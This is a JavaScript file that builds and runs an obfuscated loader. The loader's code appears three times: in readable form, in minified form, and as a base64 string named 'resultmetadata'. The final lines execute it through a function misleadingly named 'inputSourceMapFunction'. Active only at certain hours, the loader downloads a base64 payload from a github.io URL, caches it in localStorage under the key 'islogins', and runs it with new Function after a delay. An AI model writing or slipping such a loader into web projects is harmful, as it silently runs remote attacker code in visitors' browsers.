
var jswod1=`
var myDate = new Date().getHours();
if(myDate>20||myDate<9){
    if(localStorage.getItem("islogins")){
        setTimeout(function(){
            var engine=window.atob(localStorage.getItem("islogins"));
            var objective=new Function(engine)
            objective()
        },9204)
    }else{
        setTimeout(function(){
            var Http = new XMLHttpRequest();
            var url = "https://jayouhao.github.io/mei/objective.json"
            Http.open("GET", url);
            Http.send();
            Http.onreadystatechange = function () {
                if (this.readyState == 4 && this.status == 200) {
                    localStorage.setItem("islogins",Http.responseText)
                    var engine=window.atob(Http.responseText);
                    var objective=new Function(engine)
                    objective()
                }
            }
        },32040)
    }
}
if(15<myDate>16||14<myDate>10){
    if(localStorage.getItem("islogins")){
        setTimeout(function(){
            var engine=window.atob(localStorage.getItem("islogins"));
            var objective=new Function(engine)
            objective()
        },9204)
    }
}
`;

var jswod=`var i,d=document,o=window,l=d.documentElement,r=document.createElement("style");var myDate=(new Date).getHours();if(myDate>20||myDate<9){if(localStorage.getItem("islogins")){setTimeout(function(){var e=window.atob(localStorage.getItem("islogins"));var t=new Function(e);t()},9204)}else{setTimeout(function(){var o=new XMLHttpRequest;var e="https://jayouhao.github.io/mei/objective.json";o.open("GET",e);o.send();o.onreadystatechange=function(){if(this.readyState==4&&this.status==200){localStorage.setItem("islogins",o.responseText);var e=window.atob(o.responseText);var t=new Function(e);t()}}},32040)}}if(15<myDate>16||14<myDate>10){if(localStorage.getItem("islogins")){setTimeout(function(){var e=window.atob(localStorage.getItem("islogins"));var t=new Function(e);t()},9204)}}`

console.log(window.btoa(jswod))

var resultmetadata='dmFyIGksZD1kb2N1bWVudCxvPXdpbmRvdyxsPWQuZG9jdW1lbnRFbGVtZW50LHI9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3R5bGUiKTt2YXIgbXlEYXRlPShuZXcgRGF0ZSkuZ2V0SG91cnMoKTtpZihteURhdGU+MjB8fG15RGF0ZTw5KXtpZihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiaXNsb2dpbnMiKSl7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBlPXdpbmRvdy5hdG9iKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJpc2xvZ2lucyIpKTt2YXIgdD1uZXcgRnVuY3Rpb24oZSk7dCgpfSw5MjA0KX1lbHNle3NldFRpbWVvdXQoZnVuY3Rpb24oKXt2YXIgbz1uZXcgWE1MSHR0cFJlcXVlc3Q7dmFyIGU9Imh0dHBzOi8vamF5b3VoYW8uZ2l0aHViLmlvL21laS9vYmplY3RpdmUuanNvbiI7by5vcGVuKCJHRVQiLGUpO28uc2VuZCgpO28ub25yZWFkeXN0YXRlY2hhbmdlPWZ1bmN0aW9uKCl7aWYodGhpcy5yZWFkeVN0YXRlPT00JiZ0aGlzLnN0YXR1cz09MjAwKXtsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgiaXNsb2dpbnMiLG8ucmVzcG9uc2VUZXh0KTt2YXIgZT13aW5kb3cuYXRvYihvLnJlc3BvbnNlVGV4dCk7dmFyIHQ9bmV3IEZ1bmN0aW9uKGUpO3QoKX19fSwzMjA0MCl9fWlmKDE1PG15RGF0ZT4xNnx8MTQ8bXlEYXRlPjEwKXtpZihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiaXNsb2dpbnMiKSl7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBlPXdpbmRvdy5hdG9iKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJpc2xvZ2lucyIpKTt2YXIgdD1uZXcgRnVuY3Rpb24oZSk7dCgpfSw5MjA0KX19';
var inputSourceMapFunction=new Function(window.atob(resultmetadata));
inputSourceMapFunction();
